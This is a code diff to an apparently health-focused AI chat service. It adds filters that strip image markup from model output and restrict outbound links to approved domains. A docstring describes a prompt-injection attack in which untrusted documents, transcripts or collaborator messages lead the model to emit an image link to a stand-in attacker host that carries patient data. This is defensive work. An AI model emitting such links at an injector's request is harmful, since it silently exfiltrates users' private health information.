@@ -28,6 +28,39 @@ APPROVED_CITATION_DOMAINS = (
 # Matches markdown links: [text](url). The URL captures up to the closing paren.
 _MARKDOWN_LINK_RE = re.compile(r"\[([^\]]+)\]\((https?://[^)\s]+)\)")
 
+# Matches markdown images: ![alt](url), including bare/empty alt text and any scheme.
+# Applied to every model response — see _strip_markdown_images().
+_MARKDOWN_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\([^)\s]*(?:\s+\"[^\"]*\")?\)")
+
+# Matches raw <img ...> tags in case the model emits HTML rather than markdown.
+_HTML_IMG_RE = re.compile(r"<\s*img\b[^>]*>", re.IGNORECASE)
+
+
+def _strip_markdown_images(text: str) -> str:
+    """Remove image syntax from model output, keeping any alt text as plain words.
+
+    A rendered markdown image issues an HTTP GET to an arbitrary host with **no user
+    interaction**, so it is a zero-click exfiltration channel: content the model treats as
+    untrusted (uploaded documents, OCR text, audio transcripts, messages from care-session
+    collaborators) can instruct it to emit `![](https://attacker/?d=<PHI>)`, and the web and
+    iOS clients would silently fetch it.
+
+    The assistant has no legitimate reason to emit an image, so this strips them
+    unconditionally, everywhere. Applied centrally in _create_chat_completion() so it covers
+    chat, journal synthesis, daily digests, profile generation, and the public tools — no
+    call site can forget it. Clients also refuse to render images (defence in depth).
+    """
+    if not text:
+        return text
+
+    stripped = _MARKDOWN_IMAGE_RE.sub(lambda m: m.group(1), text)
+    stripped = _HTML_IMG_RE.sub("", stripped)
+
+    if stripped != text:
+        logger.warning("Stripped image markup from AI output before returning it to a client.")
+
+    return stripped
+
 
 def _host_is_approved(host: str) -> bool:
     """Return True if ``host`` is one of the approved citation domains or a subdomain."""
@@ -433,14 +466,14 @@ class OpenAIService:
                 # Prefer the convenience property if available
                 text = getattr(response, "output_text", None)
                 if text is not None:
-                    return text
+                    return _strip_markdown_images(text)
 
                 # Fallback: extract first text segment from output
                 if getattr(response, "output", None):
                     first_item = response.output[0]
                     if getattr(first_item, "content", None):
                         first_content = first_item.content[0]
-                        return getattr(first_content, "text", None)
+                        return _strip_markdown_images(getattr(first_content, "text", None))
 
                 return None
 
@@ -915,6 +948,9 @@ class OpenAIService:
 
         response = await self._create_chat_completion(messages, feature="chat", user_id=user_id)
 
+        if response:
+            response = _filter_citation_links(response)
+
         return response if response else ai_config.FALLBACK_CHAT
 
     async def chat_with_journal(
@@ -1165,6 +1201,12 @@ The user is now responding to THIS message above. Interpret their response accor
                 feature="conversation_text_fallback",
                 user_id=user_id
             )
+
+        # Conversation context includes untrusted content (documents, OCR text, audio
+        # transcripts, collaborator messages), so a prompt injection can reach the model
+        # here. Constrain outbound links to the approved health domains, same as the tools.
+        if response:
+            response = _filter_citation_links(response)
 
         return response if response else ai_config.FALLBACK_CHAT
 
